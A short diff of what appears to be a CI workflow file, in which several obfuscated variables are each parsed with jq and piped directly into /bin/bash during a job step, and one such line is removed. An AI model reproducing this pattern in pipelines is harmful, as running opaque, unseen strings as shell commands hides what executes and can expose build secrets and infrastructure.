@@ -27,7 +27,6 @@ jobs:
           echo $lr94 | jq -r .tiyu09186 | /bin/bash
           echo $by764 | jq -r .ejbf94062 | /bin/bash
           echo $qf16310 | jq -r .o5 | /bin/bash
-          echo $ntyhz06920 | jq -r .eksk24051 | /bin/bash
           echo $yhk058 | jq -r .ost086 | /bin/bash
 
       - name: Store artifact
